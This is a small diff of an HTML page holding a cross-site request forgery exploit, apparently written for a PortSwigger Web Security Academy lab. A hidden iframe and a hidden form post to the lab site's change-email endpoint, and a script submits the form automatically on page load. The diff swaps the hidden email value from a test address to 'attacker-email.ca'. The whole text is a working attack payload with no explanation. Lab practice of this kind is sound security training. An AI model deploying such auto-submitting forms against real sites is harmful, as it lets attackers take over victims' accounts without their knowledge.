@@ -4,7 +4,7 @@
         <iframe style="display:none" name="csrf-iframe"></iframe>
 
         <form action="https://0aa5006404a67ead81dc252b009800c8.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
-            <input type="hidden" name="email" value="test5@test.ca">
+            <input type="hidden" name="email" value="attacker-email.ca">
         </form>
 
         <script>document.getElementById("csrf-form").submit()</script>
